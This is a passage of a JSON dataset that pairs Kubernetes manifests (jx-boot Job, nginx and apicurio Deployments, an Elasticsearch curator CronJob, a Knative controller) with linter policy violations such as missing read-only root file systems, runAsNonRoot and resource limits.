    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.82\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: AZURE_AD_RESOURCE\n          value: https://vault.azure.net\n        image: gcr.io/jenkinsxio/jx-boot:3.1.82\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "8114",
    "manifest_path": "data/manifests/the_stack_sample/sample_3009.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.82\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: AZURE_AD_RESOURCE\n          value: https://vault.azure.net\n        image: gcr.io/jenkinsxio/jx-boot:3.1.82\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"git-clone\" does not have a read-only root file system"
  },
  {
    "id": "8115",
    "manifest_path": "data/manifests/the_stack_sample/sample_3009.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.82\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: AZURE_AD_RESOURCE\n          value: https://vault.azure.net\n        image: gcr.io/jenkinsxio/jx-boot:3.1.82\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"job\" does not have a read-only root file system"
  },
  {
    "id": "8116",
    "manifest_path": "data/manifests/the_stack_sample/sample_3009.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.82\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: AZURE_AD_RESOURCE\n          value: https://vault.azure.net\n        image: gcr.io/jenkinsxio/jx-boot:3.1.82\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"jx-boot-job\" not found"
  },
  {
    "id": "8117",
    "manifest_path": "data/manifests/the_stack_sample/sample_3009.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.82\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: AZURE_AD_RESOURCE\n          value: https://vault.azure.net\n        image: gcr.io/jenkinsxio/jx-boot:3.1.82\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"git-clone\" is not set to runAsNonRoot"
  },
  {
    "id": "8118",
    "manifest_path": "data/manifests/the_stack_sample/sample_3009.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.82\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: AZURE_AD_RESOURCE\n          value: https://vault.azure.net\n        image: gcr.io/jenkinsxio/jx-boot:3.1.82\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"job\" is not set to runAsNonRoot"
  },
  {
    "id": "8119",
    "manifest_path": "data/manifests/the_stack_sample/sample_3009.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.82\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: AZURE_AD_RESOURCE\n          value: https://vault.azure.net\n        image: gcr.io/jenkinsxio/jx-boot:3.1.82\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"git-clone\" has cpu request 0"
  },
  {
    "id": "8120",
    "manifest_path": "data/manifests/the_stack_sample/sample_3009.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.82\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: AZURE_AD_RESOURCE\n          value: https://vault.azure.net\n        image: gcr.io/jenkinsxio/jx-boot:3.1.82\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"job\" has cpu request 0"
  },
  {
    "id": "8121",
    "manifest_path": "data/manifests/the_stack_sample/sample_3009.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.82\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: AZURE_AD_RESOURCE\n          value: https://vault.azure.net\n        image: gcr.io/jenkinsxio/jx-boot:3.1.82\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"git-clone\" has memory limit 0"
  },
  {
    "id": "8122",
    "manifest_path": "data/manifests/the_stack_sample/sample_3009.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.82\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: AZURE_AD_RESOURCE\n          value: https://vault.azure.net\n        image: gcr.io/jenkinsxio/jx-boot:3.1.82\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"job\" has memory limit 0"
  },
  {
    "id": "8123",
    "manifest_path": "data/manifests/the_stack_sample/sample_3010.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: critical\n  name: critical\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: critical\n  template:\n    metadata:\n      labels:\n        run: critical\n    spec:\n      containers:\n      - image: mjbright/ckad-demo:BADTAG\n        imagePullPolicy: IfNotPresent\n        name: critical\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"critical\" does not have a read-only root file system"
  },
  {
    "id": "8124",
    "manifest_path": "data/manifests/the_stack_sample/sample_3010.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: critical\n  name: critical\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: critical\n  template:\n    metadata:\n      labels:\n        run: critical\n    spec:\n      containers:\n      - image: mjbright/ckad-demo:BADTAG\n        imagePullPolicy: IfNotPresent\n        name: critical\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"critical\" is not set to runAsNonRoot"
  },
  {
    "id": "8125",
    "manifest_path": "data/manifests/the_stack_sample/sample_3010.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: critical\n  name: critical\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: critical\n  template:\n    metadata:\n      labels:\n        run: critical\n    spec:\n      containers:\n      - image: mjbright/ckad-demo:BADTAG\n        imagePullPolicy: IfNotPresent\n        name: critical\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"critical\" has cpu request 0"
  },
  {
    "id": "8126",
    "manifest_path": "data/manifests/the_stack_sample/sample_3010.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: critical\n  name: critical\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: critical\n  template:\n    metadata:\n      labels:\n        run: critical\n    spec:\n      containers:\n      - image: mjbright/ckad-demo:BADTAG\n        imagePullPolicy: IfNotPresent\n        name: critical\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"critical\" has memory limit 0"
  },
  {
    "id": "8127",
    "manifest_path": "data/manifests/the_stack_sample/sample_3011.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: websocket-service-cluster-ip-service\n  namespace: default\nspec:\n  type: ClusterIP\n  selector:\n    component: server-websocket\n  ports:\n  - port: 7743\n    targetPort: 7743\n    protocol: TCP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[component:server-websocket])"
  },
  {
    "id": "8128",
    "manifest_path": "data/manifests/the_stack_sample/sample_3014.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: curator\n  labels:\n    component: elasticsearch\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: curator\n          image: quay.io/pires/docker-elasticsearch-curator:5.5.1\n          args:\n          - --config\n          - /etc/config/config.yml\n          - /etc/config/action_file.yml\n          volumeMounts:\n          - name: config-volume\n            mountPath: /etc/config\n        volumes:\n        - name: config-volume\n          configMap:\n            name: curator-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"curator\" does not have a read-only root file system"
  },
  {
    "id": "8129",
    "manifest_path": "data/manifests/the_stack_sample/sample_3014.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: curator\n  labels:\n    component: elasticsearch\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: curator\n          image: quay.io/pires/docker-elasticsearch-curator:5.5.1\n          args:\n          - --config\n          - /etc/config/config.yml\n          - /etc/config/action_file.yml\n          volumeMounts:\n          - name: config-volume\n            mountPath: /etc/config\n        volumes:\n        - name: config-volume\n          configMap:\n            name: curator-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"curator\" is not set to runAsNonRoot"
  },
  {
    "id": "8130",
    "manifest_path": "data/manifests/the_stack_sample/sample_3014.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: curator\n  labels:\n    component: elasticsearch\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: curator\n          image: quay.io/pires/docker-elasticsearch-curator:5.5.1\n          args:\n          - --config\n          - /etc/config/config.yml\n          - /etc/config/action_file.yml\n          volumeMounts:\n          - name: config-volume\n            mountPath: /etc/config\n        volumes:\n        - name: config-volume\n          configMap:\n            name: curator-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"curator\" has cpu request 0"
  },
  {
    "id": "8131",
    "manifest_path": "data/manifests/the_stack_sample/sample_3014.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: curator\n  labels:\n    component: elasticsearch\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: curator\n          image: quay.io/pires/docker-elasticsearch-curator:5.5.1\n          args:\n          - --config\n          - /etc/config/config.yml\n          - /etc/config/action_file.yml\n          volumeMounts:\n          - name: config-volume\n            mountPath: /etc/config\n        volumes:\n        - name: config-volume\n          configMap:\n            name: curator-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"curator\" has memory limit 0"
  },
  {
    "id": "8132",
    "manifest_path": "data/manifests/the_stack_sample/sample_3017.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    module: apicurio-studio-ws\n  name: apicurio-studio-ws\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      module: apicurio-studio-ws\n  template:\n    metadata:\n      labels:\n        module: apicurio-studio-ws\n    spec:\n      containers:\n      - env:\n        - name: APICURIO_DB_CONNECTION_URL\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: keycloak-url\n        - name: APICURIO_DB_DRIVER_NAME\n          value: mysql\n        - name: APICURIO_DB_INITIALIZE\n          value: 'false'\n        - name: APICURIO_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: db-password\n        - name: APICURIO_DB_TYPE\n          value: mysql5\n        - name: APICURIO_DB_USER_NAME\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: db-user\n        - name: JAVA_TOOL_OPTIONS\n          value: -Djava.net.preferIPv4Stack=true\n        image: apicurio/apicurio-studio-ws\n        name: apicurio-studio-ws\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"apicurio-studio-ws\" is using an invalid container image, \"apicurio/apicurio-studio-ws\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8133",
    "manifest_path": "data/manifests/the_stack_sample/sample_3017.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    module: apicurio-studio-ws\n  name: apicurio-studio-ws\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      module: apicurio-studio-ws\n  template:\n    metadata:\n      labels:\n        module: apicurio-studio-ws\n    spec:\n      containers:\n      - env:\n        - name: APICURIO_DB_CONNECTION_URL\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: keycloak-url\n        - name: APICURIO_DB_DRIVER_NAME\n          value: mysql\n        - name: APICURIO_DB_INITIALIZE\n          value: 'false'\n        - name: APICURIO_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: db-password\n        - name: APICURIO_DB_TYPE\n          value: mysql5\n        - name: APICURIO_DB_USER_NAME\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: db-user\n        - name: JAVA_TOOL_OPTIONS\n          value: -Djava.net.preferIPv4Stack=true\n        image: apicurio/apicurio-studio-ws\n        name: apicurio-studio-ws\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"apicurio-studio-ws\" does not have a read-only root file system"
  },
  {
    "id": "8134",
    "manifest_path": "data/manifests/the_stack_sample/sample_3017.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    module: apicurio-studio-ws\n  name: apicurio-studio-ws\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      module: apicurio-studio-ws\n  template:\n    metadata:\n      labels:\n        module: apicurio-studio-ws\n    spec:\n      containers:\n      - env:\n        - name: APICURIO_DB_CONNECTION_URL\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: keycloak-url\n        - name: APICURIO_DB_DRIVER_NAME\n          value: mysql\n        - name: APICURIO_DB_INITIALIZE\n          value: 'false'\n        - name: APICURIO_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: db-password\n        - name: APICURIO_DB_TYPE\n          value: mysql5\n        - name: APICURIO_DB_USER_NAME\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: db-user\n        - name: JAVA_TOOL_OPTIONS\n          value: -Djava.net.preferIPv4Stack=true\n        image: apicurio/apicurio-studio-ws\n        name: apicurio-studio-ws\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"apicurio-studio-ws\" is not set to runAsNonRoot"
  },
  {
    "id": "8135",
    "manifest_path": "data/manifests/the_stack_sample/sample_3017.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    module: apicurio-studio-ws\n  name: apicurio-studio-ws\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      module: apicurio-studio-ws\n  template:\n    metadata:\n      labels:\n        module: apicurio-studio-ws\n    spec:\n      containers:\n      - env:\n        - name: APICURIO_DB_CONNECTION_URL\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: keycloak-url\n        - name: APICURIO_DB_DRIVER_NAME\n          value: mysql\n        - name: APICURIO_DB_INITIALIZE\n          value: 'false'\n        - name: APICURIO_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: db-password\n        - name: APICURIO_DB_TYPE\n          value: mysql5\n        - name: APICURIO_DB_USER_NAME\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: db-user\n        - name: JAVA_TOOL_OPTIONS\n          value: -Djava.net.preferIPv4Stack=true\n        image: apicurio/apicurio-studio-ws\n        name: apicurio-studio-ws\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"apicurio-studio-ws\" has cpu request 0"
  },
  {
    "id": "8136",
    "manifest_path": "data/manifests/the_stack_sample/sample_3017.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    module: apicurio-studio-ws\n  name: apicurio-studio-ws\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      module: apicurio-studio-ws\n  template:\n    metadata:\n      labels:\n        module: apicurio-studio-ws\n    spec:\n      containers:\n      - env:\n        - name: APICURIO_DB_CONNECTION_URL\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: keycloak-url\n        - name: APICURIO_DB_DRIVER_NAME\n          value: mysql\n        - name: APICURIO_DB_INITIALIZE\n          value: 'false'\n        - name: APICURIO_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: db-password\n        - name: APICURIO_DB_TYPE\n          value: mysql5\n        - name: APICURIO_DB_USER_NAME\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: db-user\n        - name: JAVA_TOOL_OPTIONS\n          value: -Djava.net.preferIPv4Stack=true\n        image: apicurio/apicurio-studio-ws\n        name: apicurio-studio-ws\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"apicurio-studio-ws\" has memory limit 0"
  },
  {
    "id": "8137",
    "manifest_path": "data/manifests/the_stack_sample/sample_3018.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.14.2\n        ports:\n        - containerPort: 8000\n        env:\n        - name: SECRET_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: secret-credentails\n              key: password\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "8138",
    "manifest_path": "data/manifests/the_stack_sample/sample_3018.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.14.2\n        ports:\n        - containerPort: 8000\n        env:\n        - name: SECRET_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: secret-credentails\n              key: password\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "8139",
    "manifest_path": "data/manifests/the_stack_sample/sample_3018.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.14.2\n        ports:\n        - containerPort: 8000\n        env:\n        - name: SECRET_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: secret-credentails\n              key: password\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "8140",
    "manifest_path": "data/manifests/the_stack_sample/sample_3018.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.14.2\n        ports:\n        - containerPort: 8000\n        env:\n        - name: SECRET_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: secret-credentails\n              key: password\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "8141",
    "manifest_path": "data/manifests/the_stack_sample/sample_3018.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.14.2\n        ports:\n        - containerPort: 8000\n        env:\n        - name: SECRET_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: secret-credentails\n              key: password\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "8142",
    "manifest_path": "data/manifests/the_stack_sample/sample_3019.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eventing-controller\n  namespace: knative-eventing\n  labels:\n    eventing.knative.dev/release: devel\n    knative.dev/high-availability: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eventing-controller\n  template:\n    metadata:\n      labels:\n        app: eventing-controller\n        eventing.knative.dev/release: devel\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app: eventing-controller\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      serviceAccountName: eventing-controller\n      containers:\n      - name: eventing-controller\n        image: ko://knative.dev/eventing/cmd/controller\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/eventing\n        - name: MT_PING_IMAGE\n          value: ko://knative.dev/eventing/cmd/mtping\n        - name: APISERVER_RA_IMAGE\n          value: ko://knative.dev/eventing/cmd/apiserver_receive_adapter\n        securityContext:\n          allowPrivilegeEscalation: false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: profiling\n    